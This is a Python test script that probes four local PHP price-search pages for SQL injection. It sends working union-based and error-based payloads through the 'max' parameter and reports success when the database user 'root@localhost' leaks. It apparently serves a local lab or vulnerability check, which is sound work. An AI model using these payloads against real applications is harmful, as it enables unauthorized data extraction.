import requests

print("------------------------------------")

def test_correct_functionality(base_url, file_names):
    max_price = 1

    for file_name in file_names:
        url = f"{base_url}/{file_name}?max={max_price}"
        response = requests.get(url)
        #print(response.text)

        count = response.text.count("<br/>")
        try:
            assert response.status_code == 200 and count > 0
            print(f"Functionality worked for {file_name} and {count} item(s) were found")
        except AssertionError:
            print(f"No items found in {file_name}")
    print("------------------------------------")


########## Union Based Injection Testing #############

def test_union_based_injection(base_url, file_names):
    for file_name in file_names:
        max = "50 UNION SELECT user(),user() FROM users-- -"
        url = f"{base_url}/{file_name}?max={max}"
        response = requests.get(url)
       # print(response.text)
        try:
            assert response.status_code == 200 and "root@localhost" in response.text
            print(f"Union-Based injection passed for {file_name}")
        except AssertionError:
            print(f"Union-Based injection failed for {file_name}")
    print("------------------------------------")

########## Error Based Injection Testing #############

def test_error_based_injection(base_url, file_names):
    for file_name in file_names:
        search = "1 AND ExtractValue(0,CONCAT(0x5c,USER())) -- -"
        url = f"{base_url}/{file_name}?max={search}"
        response = requests.get(url)
       # print(response.text)
        try:
            assert response.status_code == 200 and 'root@localhost' in response.text
            print(f"Error-Based injection passed for {file_name}")
        except AssertionError:
            print(f"Error-Based injection failed for {file_name}")
    print("------------------------------------")


base_url = "http://localhost:4000/sqli"
file_names = ["search_by_price.php", "search_by_price2.php", "search_by_price3.php", "search_by_price4.php"]

test_correct_functionality(base_url, file_names)
test_union_based_injection(base_url, file_names)
test_error_based_injection(base_url, file_names)
